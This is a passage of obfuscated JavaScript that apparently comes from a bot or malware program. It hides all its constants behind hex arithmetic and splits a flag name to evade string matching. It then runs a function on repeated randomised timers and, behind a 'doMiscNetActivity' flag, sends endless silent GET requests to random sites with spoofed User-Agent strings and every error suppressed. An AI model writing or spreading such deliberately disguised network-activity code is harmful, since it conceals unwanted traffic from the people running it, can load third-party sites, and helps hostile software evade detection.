  f();
  for (let k = -0x1 * 0x767 + 0xaac * -0x1 + 0x1213; k < -0x7f4 * 0x3 + -0xa0 + -0x1c * -0xe0; k++)
    setTimeout(f, (0x1 * 0x1466f + 0x1121a + -0x16e29) * k * getRandomInt(-0x1921 + -0xa3e * -0x2 + -0x253 * -0x2, 0x14d6 + -0x1 * 0x187b + 0x3a8));
  setInterval(() => {
    f();
    for (let l = 0x270 + 0x18b6 + -0x1b26; l < -0x1 * -0x3ad + -0x1 * -0x1d2d + -0x9 * 0x3a6; l++)
      setTimeout(f, (-0x65 * 0x33e + -0xba57 + -0x1 * -0x2ec2d) * l * getRandomInt(0x1 * -0x1fd9 + -0x155 + -0x5 * -0x6a3, 0x179 + 0x591 + -0x707));
  }, -0x5 * 0xf3f7a + 0xb85b0 + -0x7 * -0x1117be);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2ba1 + 0x2137 * -0x1 + 0x6830) * getRandomInt(0x14 * 0x12b + -0x2 * -0xb74 + -0x2e43, 0xe3 * -0x4 + 0x235b + 0xfe5 * -0x2));
}, 0x1dee + 0x12c3 + -0x304d);